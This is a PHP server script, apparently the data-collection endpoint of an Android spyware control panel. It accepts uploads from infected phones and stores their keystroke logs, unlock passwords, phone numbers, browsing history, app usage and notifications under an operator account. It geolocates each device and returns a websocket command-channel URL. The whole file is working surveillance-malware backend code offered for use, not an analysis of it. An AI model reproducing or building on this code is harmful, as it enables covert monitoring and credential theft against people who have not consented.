<?php
date_default_timezone_set('Asia/Shanghai');
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED);

require_once '../private/Eaod85401.php';
require_once __DIR__ . '/../vendor/autoload.php';

use MaxMind\Db\Reader;

function getCountry($ipAddress)
{
    try {
        $databasePath = __DIR__ . '/assets/GeoIP/GeoLite2-City.mmdb'; // 使用 City 数据库
        $reader = new Reader($databasePath);
        $record = $reader->get($ipAddress);
        $reader->close();

        if (isset($record['country']['names']['en'])) {
            return $record['country']['names']['en'];
        } else {
            logToFile("WARN: Country not found for IP: $ipAddress");
            return 'unknown';
        }
    } catch (Exception $e) {
        logToFile("ERROR: " . $e->getMessage());
        return 'not found';
    }
}

function logToFile($message)
{
    $logFile = __DIR__ . '/geoip_errors.log';
    $log = "[" . date("Y-m-d H:i:s") . "] $message\n";
    file_put_contents($logFile, $log, FILE_APPEND);
}

function generateUUID()
{
    return sprintf(
        '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff)
    );
}

function isBase64($str)
{
    return preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $str) && strlen($str) % 4 == 0;
}

function isOwnershipLockEnabled(): bool
{
    if (!defined('DEVICE_OWNERSHIP_LOCK')) return true;
    $v = strtolower(trim((string)DEVICE_OWNERSHIP_LOCK));
    return ($v === '' || $v === '1' || $v === 'true' || $v === 'yes');
}

function ensureOwnershipTables(PDO $pdo): void
{
    $pdo->exec("CREATE TABLE IF NOT EXISTS device_ownership (
        phone_id varchar(100) NOT NULL,
        usrname varchar(100) NOT NULL,
        user_email varchar(255) NOT NULL,
        locked tinyint(1) NOT NULL DEFAULT 1,
        created_at datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
        updated_at datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        PRIMARY KEY (phone_id),
        KEY idx_usrname (usrname),
        KEY idx_user_email (user_email)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");

    $pdo->exec("CREATE TABLE IF NOT EXISTS device_ownership_events (
        id bigint NOT NULL AUTO_INCREMENT,
        event_time datetime NOT NULL,
        event_type varchar(30) NOT NULL,
        phone_id varchar(100) NOT NULL,
        from_usrname varchar(100) DEFAULT NULL,
        to_usrname varchar(100) DEFAULT NULL,
        ip varchar(64) DEFAULT NULL,
        source varchar(20) DEFAULT NULL,
        note varchar(255) DEFAULT NULL,
        PRIMARY KEY (id),
        KEY idx_event_time (event_time),
        KEY idx_phone_id (phone_id),
        KEY idx_event_type (event_type)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
}

function enforceDeviceOwnership(PDO $pdo, string $phoneId, string $attemptUsrname, string $attemptUserEmail, string $source = 'ping'): string
{
    $phoneId = trim($phoneId);
    if ($phoneId === '') return $attemptUsrname;

    $lockEnabled = isOwnershipLockEnabled();
    ensureOwnershipTables($pdo);

    $stmt = $pdo->prepare('SELECT usrname, user_email, locked FROM device_ownership WHERE phone_id = ? LIMIT 1');
    $stmt->execute([$phoneId]);
    $row = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$row) {
        $locked = $lockEnabled ? 1 : 0;
        $ins = $pdo->prepare('INSERT INTO device_ownership (phone_id, usrname, user_email, locked) VALUES (?, ?, ?, ?)');
        $ins->execute([$phoneId, $attemptUsrname, $attemptUserEmail, $locked]);

        $evt = $pdo->prepare('INSERT INTO device_ownership_events (event_time, event_type, phone_id, from_usrname, to_usrname, ip, source, note) VALUES (NOW(), ?, ?, ?, ?, ?, ?, ?)');
        $evt->execute([
            'bind',
            $phoneId,
            null,
            $attemptUsrname,
            $_SERVER['REMOTE_ADDR'] ?? null,
            $source,
            $locked ? 'locked' : 'unlocked'
        ]);

        return $attemptUsrname;
    }

    $currentUsrname = (string)($row['usrname'] ?? '');
    $locked = (int)($row['locked'] ?? 1) === 1;

    if ($locked && $currentUsrname !== '' && $attemptUsrname !== '' && $currentUsrname !== $attemptUsrname) {
        // 记录一次“尝试转移”但不允许
        $evt = $pdo->prepare('INSERT INTO device_ownership_events (event_time, event_type, phone_id, from_usrname, to_usrname, ip, source, note) VALUES (NOW(), ?, ?, ?, ?, ?, ?, ?)');
        $evt->execute([
            'transfer_blocked',
            $phoneId,
            $currentUsrname,
            $attemptUsrname,
            $_SERVER['REMOTE_ADDR'] ?? null,
            $source,
            'ownership locked'
        ]);

        return $currentUsrname;
    }

    // 未锁定：允许更新绑定（审计）
    if (!$locked && $currentUsrname !== $attemptUsrname) {
        $upd = $pdo->prepare('UPDATE device_ownership SET usrname = ?, user_email = ?, updated_at = NOW() WHERE phone_id = ?');
        $upd->execute([$attemptUsrname, $attemptUserEmail, $phoneId]);

        $evt = $pdo->prepare('INSERT INTO device_ownership_events (event_time, event_type, phone_id, from_usrname, to_usrname, ip, source, note) VALUES (NOW(), ?, ?, ?, ?, ?, ?, ?)');
        $evt->execute([
            'transfer_allowed',
            $phoneId,
            $currentUsrname,
            $attemptUsrname,
            $_SERVER['REMOTE_ADDR'] ?? null,
            $source,
            'ownership unlocked'
        ]);
    }

    return $attemptUsrname;
}

function recordDeviceOnlineEvent(PDO $pdo, string $phoneId, string $usrname, string $phoneName, string $address, string $country): void
{
    ensureOwnershipTables($pdo);

    $evt = $pdo->prepare('INSERT INTO device_ownership_events (event_time, event_type, phone_id, from_usrname, to_usrname, ip, source, note) VALUES (NOW(), ?, ?, ?, ?, ?, ?, ?)');
    $evt->execute([
        'device_online',
        $phoneId,
        null,
        $usrname,
        $address,
        'ping',
        trim($phoneName . ' | ' . $country)
    ]);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name . ";charset=utf8mb4", DB_UserName, DB_Password);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        // 参数
        $userEmail      = $_POST['user_email'] ?? 'empty';
        $phone_id       = $_POST['phone_id'] ?? '';
        $phoneName      = $_POST['phone_name'] ?? '';
        $androidVersion = $_POST['android_version'] ?? '';
        $model          = $_POST['model'] ?? '';
        $phonepassword  = $_POST['phone_password'] ?? '';
        $phonenumber    = $_POST['phone_number'] ?? '';
        $batteryCharge  = $_POST['battery_charge'] ?? '';
        $network        = $_POST['network'] ?? '';
        $installDate    = $_POST['install_date'] ?? '';
        $phone_idf      = $_POST['idf'] ?? '';
        $wallp          = $_POST['wallpap'] ?? '-1';
        $keylogs        = $_POST['keylogs'] ?? '';
        $visitedlinks   = $_POST['vLinks'] ?? '';
        $visitedapps    = $_POST['vapps'] ?? '';
        $notifications  = $_POST['notifys'] ?? '';
        $activz         = $_POST['activz'] ?? '';
        $isonline = array_key_exists('isonline', $_POST) ? $_POST['isonline'] : '1';
        $accessibility  = $_POST['accessibility'] ?? '0';
        $address        = $_SERVER['REMOTE_ADDR'];
        $country        = getCountry($address);

        if ($wallp !== '-1' && !isBase64($wallp)) {
            $wallp = '-1';
        }

        // 如果 phone_id 为空，生成一个新的 UUID
        if ($phone_id === 'empty' || empty($phone_id)) {
            $phone_id = generateUUID();
        }
        // 判断如果安卓版本、型号和安装日期都为空，则不插入数据库
        if (empty($phoneName) && empty($androidVersion) && empty($model) && empty($installDate)) {
            // 如果三个字段都为空，则跳过插入操作
            echo "Skipping insert: Android version, model, and install date are all empty.";
            exit; // 退出，避免插入数据库
        }

        // ✅ 正确字段是 usrname，不是 username - 必须校验用户存在
        $stmt = $pdo->prepare("SELECT usrname FROM users WHERE email = ?");
        $stmt->execute([$userEmail]);
        $usrname = $stmt->fetchColumn();

        if (!$usrname) {
            http_response_code(400);
            echo "Invalid user.";
            exit;
        }

        // 🔒 设备归属锁：同一 phone_id 一旦绑定账号，后续禁止被 user_email 改写转移
        $usrname = enforceDeviceOwnership($pdo, $phone_id, (string)$usrname, (string)$userEmail, 'ping');

        $isNewDeviceStmt = $pdo->prepare('SELECT COUNT(*) FROM phones WHERE phone_id = ?');
        $isNewDeviceStmt->execute([$phone_id]);
        $isNewDevice = (int)$isNewDeviceStmt->fetchColumn() === 0;

        $timenow = date('Y-m-d H:i:s');
        $defaultOptions = '{"Activities":"0","keystrokes":"1","notifications":"1","visitedapps":"0","visitedlinks":"0","livenotify":"0"}';

        $stmt = $pdo->prepare("
            INSERT INTO phones (
                phone_id, usrname, phone_name, country, address, android_ver, model, phonepassword,
                phonenumber, wallpaper, battery_charg, network, install_date, last_ping,
                files_path, files_data, mob_permissions, keylogs_dates, visited_links,
                visited_apps, notifications, activities, phone_options, session_id,
                Commands, isonline, isRemoved, accessibility
            ) VALUES (
                ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
            )
            ON DUPLICATE KEY UPDATE
                usrname = VALUES(usrname),
                phone_name = VALUES(phone_name),
                country = VALUES(country),
                address = VALUES(address),
                android_ver = VALUES(android_ver),
                model = VALUES(model),
                phonepassword = VALUES(phonepassword),
                phonenumber = VALUES(phonenumber),
                wallpaper = VALUES(wallpaper),
                battery_charg = VALUES(battery_charg),
                network = VALUES(network),
                install_date = VALUES(install_date),
                last_ping = VALUES(last_ping),
                files_path = VALUES(files_path),
                files_data = VALUES(files_data),
                mob_permissions = VALUES(mob_permissions),
                keylogs_dates = VALUES(keylogs_dates),
                visited_links = VALUES(visited_links),
                visited_apps = VALUES(visited_apps),
                notifications = VALUES(notifications),
                activities = VALUES(activities),
                phone_options = VALUES(phone_options),
                session_id = VALUES(session_id),
                Commands = VALUES(Commands),
                isonline = VALUES(isonline),
                isRemoved = VALUES(isRemoved),
                accessibility = VALUES(accessibility)
        ");

        $stmt->execute([
            $phone_id,
            $usrname, // ✅ 使用 usrname 替代 user_id
            $phoneName,
            $country,
            $address,
            $androidVersion,
            $model,
            $phonepassword,
            $phonenumber,
            $wallp,
            $batteryCharge,
            $network,
            $installDate,
            $timenow,
            '',
            '', // files_path, files_data
            null, // mob_permissions
            $keylogs,
            $visitedlinks,
            $visitedapps,
            $notifications,
            $activz,
            $defaultOptions,
            $phone_idf,
            '', // Commands
            $isonline,  // isonline
            0,  // isRemoved
            $accessibility
        ]);

        if ($isNewDevice) {
            recordDeviceOnlineEvent($pdo, $phone_id, (string)$usrname, (string)$phoneName, (string)$address, (string)$country);
        }

        // 使用当前服务器地址，避免数据转发到外部域名
        if (defined('WS_SERVER_URL')) {
            $baseUrl = WS_SERVER_URL;
        } else {
            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'wss' : 'ws';
            $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
            $host = preg_replace('/:\d+$/', '', $host);
            $baseUrl = $protocol . '://' . $host . '/api/ws/';
        }
        $wsSecret = defined('WS_SECRET') ? WS_SECRET : '';
        if ($wsSecret !== '') {
            $sep = (strpos($baseUrl, '?') !== false) ? '&' : '?';
            $baseUrl .= $sep . 'k=' . urlencode($wsSecret);
        }
        $authkeys = ["sk" => $baseUrl];

        echo "Conf:" . json_encode($authkeys);
    } catch (Exception $e) {
        http_response_code(500);
        echo "ERROR: Server busy";
        error_log("Ping: " . $e->getMessage());
    }
} else {
    http_response_code(405);
    echo "Invalid request method.";
}
